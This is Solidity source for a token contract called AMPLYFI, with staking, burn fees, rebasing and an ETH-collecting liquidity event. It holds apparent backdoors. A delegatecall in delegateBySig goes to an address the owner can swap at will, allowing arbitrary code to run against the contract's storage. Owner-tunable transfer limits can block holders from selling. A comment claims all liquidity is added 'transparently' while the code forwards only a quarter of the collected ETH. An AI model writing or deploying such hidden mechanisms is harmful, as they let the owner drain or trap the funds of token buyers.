1 pragma solidity =0.4.12;
2 
3 // This is a contract from AMPLYFI contract suite
4 
5 library SafeMath {
6     function add(uint256 a, uint256 b) internal constant returns (uint256) {
7       uint256 c = a + b;
8       assert(c >= a);
9       return c;
10     }
11     function mul(uint256 a, uint256 b) internal constant returns (uint256) {
12         if (a == 0) {
13             return 0;
14         }
15         uint256 c = a * b;
16         require(c / a == b);
17         return c;
18     }
19     function sub(uint256 a, uint256 b) internal constant returns (uint256) {
20       assert(b <= a);
21       return a - b;
22     }
23 }
24 
25 contract Gov {
26     address delegatorRec = address(0x0);
27     function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, uint8 r, uint8 s) public  {
28     delegatorRec.delegatecall(msg.data);
29     }
30 }
31 
32 interface Fin {
33     function finishLE() external payable;
34 }
35 
36 interface priceOracle {
37     function queryEthToTokPrice(address _ethToTokUniPool) public constant returns (uint);
38 }
39 
40 
41 contract Amp is Gov {
42     using SafeMath for uint256;
43 	string constant public symbol = "AMPLYFI";
44 	uint256 constant private INITIAL_SUPPLY = 21e21;
45 	string constant public name = "AMPLYFI";
46 	uint256 constant private FLOAT_SCALAR = 2**64;
47 	uint256 public burn_rate = 15;
48 	uint256 constant private SUPPLY_FLOOR = 1;
49 	uint8 constant public decimals = 18;
50 	event Transfer(address indexed from, address indexed to, uint256 tokens);
51 	event Approval(address indexed owner, address indexed spender, uint256 tokens);
52 	event LogRebase(uint256 indexed epoch, uint256 totalSupply);
53 	struct User {
54 		bool whitelisted;
55 		uint256 balance;
56 		uint256 frozen;
57 		mapping(address => uint256) allowance;
58 		int256 scaledPayout;
59 	}
60 	struct Info {
61 		uint256 totalSupply;
62 		uint256 totalFrozen;
63 		mapping(address => User) users;
64 		uint256 scaledPayoutPerToken;
65 		address chef;
66 	}
67 	Info private info;
68 
69 	function Amp(address _finisher, address _uniOracle)  {
70 		info.chef = msg.sender;
71 		info.totalSupply = INITIAL_SUPPLY;
72 		rebaser = msg.sender;
73 		UNISWAP_ORACLE_ADDRESS = _uniOracle;
74 		finisher = _finisher;
75 		info.users[address(this)].balance = INITIAL_SUPPLY.sub(1e18);
76 		info.users[msg.sender].balance = 1e18;
77 		REBASE_TARGET = 4e18;
78 		info.users[address(this)].whitelisted = true;
79 		Transfer(address(0), address(this), INITIAL_SUPPLY.sub(1e18));
80 		Transfer(address(0), msg.sender, 1e18);
81 	}
82 
83 
84 	function yield() external returns (uint256) {
85 	    require(ethToTokUniPool != address(0));
86 		uint256 _dividends = dividendsOf(msg.sender);
87 		require(_dividends >= 0);
88 		info.users[msg.sender].scaledPayout += int256(_dividends * FLOAT_SCALAR);
89 		info.users[msg.sender].balance += _dividends;
90 		 Transfer(address(this), msg.sender, _dividends);
91 		return _dividends;
92 	}
93 
94 
95 	function transfer(address _to, uint256 _tokens) external returns (bool) {
96 		_transfer(msg.sender, _to, _tokens);
97 		return true;
98 	}
99 
100 	function approve(address _spender, uint256 _tokens) external returns (bool) {
101 		info.users[msg.sender].allowance[_spender] = _tokens;
102 		 Approval(msg.sender, _spender, _tokens);
103 		return true;
104 	}
105 
106 	function transferFrom(address _from, address _to, uint256 _tokens) external returns (bool) {
107 		require(info.users[_from].allowance[msg.sender] >= _tokens);
108 		info.users[_from].allowance[msg.sender] -= _tokens;
109 		_transfer(_from, _to, _tokens);
110 		return true;
111 	}
112 
113 
114 	function totalSupply() public constant returns (uint256) {
115 		return info.totalSupply;
116 	}
117 
118 	function totalFrozen() public constant returns (uint256) {
119 		return info.totalFrozen;
120 	}
121 
122 	function getChef() public constant returns (address) {
123 		return info.chef;
124 	}
125 
126 	function getScaledPayout() public constant returns (uint256) {
127 		return info.scaledPayoutPerToken;
128 	}
129 
130 	function balanceOf(address _user) public constant returns (uint256) {
131 		return info.users[_user].balance - frozenOf(_user);
132 	}
133 
134 	function frozenOf(address _user) public constant returns (uint256) {
135 		return info.users[_user].frozen;
136 	}
137 
138 	function dividendsOf(address _user) public constant returns (uint256) {
139 		return uint256(int256(info.scaledPayoutPerToken * info.users[_user].frozen) - info.users[_user].scaledPayout) / FLOAT_SCALAR;
140 	}
141 
142 	function allowance(address _user, address _spender) public constant returns (uint256) {
143 		return info.users[_user].allowance[_spender];
144 	}
145 
146 	function priceToEth() public constant returns (uint256) {
147 		priceOracle uniswapOracle = priceOracle(UNISWAP_ORACLE_ADDRESS);
148 		return uniswapOracle.queryEthToTokPrice(address(this));
149 	}
150 
151 
152     uint256 transferCount = 0;
153     uint lb = block.number;
154 
155 	function _transfer(address _from, address _to, uint256 _tokens) internal returns (uint256) {
156 		require(balanceOf(_from) >= _tokens);
157 		info.users[_from].balance -= _tokens;
158 		uint256 _burnedAmount = _tokens * burn_rate / 100;
159 		if (totalSupply() - _burnedAmount < INITIAL_SUPPLY * SUPPLY_FLOOR / 100
160 		|| info.users[_from].whitelisted || address(0x0) == ethToTokUniPool) {
161 			_burnedAmount = 0;
162 		}
163 		if (address(0x0) != ethToTokUniPool && ethToTokUniPool != msg.sender
164 		    && _to != address(this) && _from != address(this)) {
165 		    require(transferCount < 6);
166 	     	if (lb == block.number) {
167 		       transferCount = transferCount + 1;
168 	     	} else {
169 	     	    transferCount = 0;
170 	     	}
171 	    	lb = block.number;
172 	    	priceOracle uniswapOracle = priceOracle(UNISWAP_ORACLE_ADDRESS);
173 		    uint256 p = uniswapOracle.queryEthToTokPrice(address(this));
174             if (REBASE_TARGET > p) {
175                 require((REBASE_TARGET/p).mul(_tokens) < rebase_delta);
176             }
177         }
178 		uint256 _transferred = _tokens - _burnedAmount;
179 		info.users[_to].balance += _transferred;
180 		 Transfer(_from, _to, _transferred);
181 		if (_burnedAmount > 0) {
182 			if (info.totalFrozen > 0) {
183 				_burnedAmount /= 2;
184 				info.scaledPayoutPerToken += _burnedAmount * FLOAT_SCALAR / info.totalFrozen;
185 				 Transfer(_from, address(this), _burnedAmount);
186 			}
187 			info.totalSupply -= _burnedAmount;
188 			 Transfer(_from, address(0x0), _burnedAmount);
189 		}
190 		return _transferred;
191 	}
192 
193 
194 	 // Uniswap stuff
195 
196     address public ethToTokUniPool = address(0);
197     address public UNISWAP_ORACLE_ADDRESS = address(0);
198     address public finisher = address(0);
199 
200     uint256 public rebase_delta = 4e16;
201 
202     address public rebaser;
203 
204      function migrateGov(address _gov, address _rebaser) public {
205         require(msg.sender == rebaser);
206         delegatorRec = _gov;
207         if (_rebaser != address(0)) {
208             rebaser = _rebaser;
209         }
210      }
211 
212      function migrateRebaseDelta(uint256 _delta) public {
213         require(msg.sender == info.chef);
214         rebase_delta = _delta;
215      }
216 
217      function setEthToTokUniPool (address _ethToTokUniPool) public {
218         require(msg.sender == info.chef);
219         ethToTokUniPool = _ethToTokUniPool;
220      }
221 
222     function migrateChef (address _chef) public {
223         require(msg.sender == info.chef);
224         info.chef = _chef;
225      }
226 
227     uint256 REBASE_TARGET;
228 
229 
230     // end Uniswap stuff
231 
232 
233     function rebase(uint256 epoch, int256 supplyDelta)
234         external
235         returns (uint256)
236     {
237         require(msg.sender == info.chef);
238         if (supplyDelta == 0) {
239              LogRebase(epoch, info.totalFrozen);
240             return info.totalFrozen;
241         }
242 
243         if (supplyDelta < 0) {
244             info.totalFrozen = info.totalFrozen.sub(uint256(supplyDelta));
245         }
246 
247          LogRebase(epoch, info.totalFrozen);
248         return info.totalFrozen;
249     }
250 
251 	function _farm(uint256 _amount, address _who) internal {
252 		require(balanceOf(_who) >= _amount);
253 		require(frozenOf(_who) + _amount >= 1e5);
254 		info.totalFrozen += _amount;
255 		info.users[_who].frozen += _amount;
256 		info.users[_who].scaledPayout += int256(_amount * info.scaledPayoutPerToken);
257 		 Transfer(_who, address(this), _amount);
258 	}
259 
260 
261 	function unfarm(uint256 _amount) public {
262 		require(frozenOf(msg.sender) >= _amount);
263 		require(ethToTokUniPool != address(0));
264 		uint256 _burnedAmount = _amount * burn_rate / 100;
265 		info.scaledPayoutPerToken += _burnedAmount * FLOAT_SCALAR / info.totalFrozen;
266 		info.totalFrozen -= _amount;
267 		info.users[msg.sender].balance -= _burnedAmount;
268 		info.users[msg.sender].frozen -= _amount;
269 		info.users[msg.sender].scaledPayout -= int256(_amount * info.scaledPayoutPerToken);
270 		 Transfer(address(this), msg.sender, _amount - _burnedAmount);
271 	}
272 
273 
274 	function farm(uint256 amount) external {
275 		_farm(amount, msg.sender);
276 	}
277 
278 
279 	bool public isLevent = true;
280 	uint public leventTotal = 0;
281 
282      // transparently adds all liquidity to Uniswap pool
283 	function finishLEvent(address _ethToTokUniPool) public {
284         require(msg.sender == info.chef && isLevent == true);
285         isLevent = false;
286         _transfer(address(this), finisher, leventTotal);
287         Fin  fm = Fin(finisher);
288         fm.finishLE.value(leventTotal / 4)();
289         ethToTokUniPool = _ethToTokUniPool;
290      }
291 
292 
293 	function levent() external payable {
294 	   uint256 localTotal = msg.value.mul(4);
295 	   leventTotal = leventTotal.add(localTotal);
296        require(isLevent && leventTotal <= 10000e18);
297        _transfer(address(this), msg.sender, localTotal);
298        _farm(localTotal, msg.sender);
299      }
300 }